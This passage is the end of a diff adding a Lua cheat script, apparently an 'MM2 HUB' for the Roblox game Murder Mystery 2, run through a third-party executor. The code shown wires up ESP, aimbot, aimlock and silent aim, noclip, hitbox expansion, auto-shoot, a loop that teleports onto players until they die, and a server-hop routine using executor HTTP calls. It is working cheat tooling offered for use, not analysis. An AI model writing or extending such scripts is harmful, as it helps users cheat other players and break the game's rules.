+                        while v.Character and v.Character.Humanoid.Health > 0 and tick() - start < 5 do
+                            TeleportToPlayer(v, 1)
+                            task.wait(0.1)
+                        end
+                    end
+                end
+            end)
+        end
+    end)
+end
+
+-- ---------- 13.22 Hop Server ----------
+local TeleportService = game:GetService("TeleportService")
+
+function HopServer()
+    local baseUrl = "https://games.roblox.com/v1/games/142823291/servers/Public?limit=100"
+    local httpRequest = (syn and syn.request) or (http and http.request) or (request)
+    if not httpRequest then
+        Notify("Hop", "Your executor does not support HTTP requests", 4, "solar:warning-bold")
+        return
+    end
+    local ok, response = pcall(function()
+        return httpRequest({ Url = baseUrl, Method = "GET" })
+    end)
+    if not ok or not response or not response.Body then
+        Notify("Hop", "Server list request failed", 4, "solar:warning-bold")
+        return
+    end
+    local data = HttpService:JSONDecode(response.Body)
+    local candidates = {}
+    if data and data.data then
+        for _, s in ipairs(data.data) do
+            if s.playing < s.maxPlayers and s.id ~= game.JobId then
+                table.insert(candidates, s)
+            end
+        end
+    end
+    if #candidates > 0 then
+        local target = candidates[math.random(1, #candidates)]
+        Notify("Hop", "Joining server " .. tostring(target.id):sub(1, 8) .. "...", 5, "solar:rocket-bold")
+        task.wait(1)
+        pcall(function()
+            TeleportService:TeleportToPlaceInstance(142823291, target.id, LocalPlayer)
+        end)
+    else
+        Notify("Hop", "No server available", 4, "solar:warning-bold")
+    end
+end
+
+-- ---------- 13.24 Cleanup ----------
+function Cleanup()
+    for _, c in ipairs(Connections) do
+        if c and c.Disconnect then c:Disconnect() end
+    end
+    Connections = {}
+    ClearESP()
+    ClearCoinESP()
+    if FOVCircle then FOVCircle:Remove() end
+    StopFly()
+end
+
+-- ============================================================
+--  14. MAIN LOOPS (RunService)
+-- ============================================================
+Connections[#Connections + 1] = RunService.RenderStepped:Connect(function(dt)
+    UpdateESP(dt)
+    UpdateAimbot(dt)
+    UpdateAimlock(dt)
+    UpdateFOVCircle()
+    if State.flyEnabled then
+        -- Fly loop is already handled by its own connection
+    end
+end)
+
+Connections[#Connections + 1] = RunService.Stepped:Connect(function()
+    UpdateNoclip()
+    UpdateHitbox()
+    AutoShootLoop()
+end)
+
+-- Refresh ESP when a player spawns
+Players.PlayerAdded:Connect(function(p)
+    task.wait(1)
+    if State.espEnabled then ApplyESP() end
+    pcall(function() PlayerDropdown:Refresh(GetPlayerList()) end)
+end)
+Players.PlayerRemoving:Connect(function()
+    task.wait(0.5)
+    if State.espEnabled then ApplyESP() end
+    pcall(function() PlayerDropdown:Refresh(GetPlayerList()) end)
+end)
+LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(2)
+    if State.espEnabled then ApplyESP() end
+    if State.speedEnabled then ApplyWalkSpeed() end
+end)
+
+-- Refresh Coin ESP periodically
+task.spawn(function()
+    while true do
+        if State.coinESP then
+            task.wait(3)
+            ApplyCoinESP()
+        else
+            task.wait(1)
+        end
+    end
+end)
+
+-- ============================================================
+--  15. INITIALIZATION
+-- ============================================================
+SetupAntiAFK()
+SetupInfJump()
+SetupChatCommands()
+WatchGunDrop()
+WatchMurderer()
+SetupSilentAim()
+
+-- Force the Window to appear (the first tab is selected by default)
+task.spawn(function()
+    pcall(function() Window:Open() end)
+end)
+
+-- ============================================================
+--  16. STARTUP NOTIFICATION
+-- ============================================================
+WindUI:Notify({
+    Title = "MM2 HUB loaded",
+    Content = "Welcome! Press RightControl to open/close.\nWindUI v" .. tostring(WindUI.Version or "?"),
+    Duration = 6,
+    Icon = "solar:knife-bold-duotone",
+})
+
+print("[MM2 Hub] Script loaded — WindUI v" .. tostring(WindUI.Version or "?"))
+print("[MM2 Hub] Press RightControl to open/close the menu")
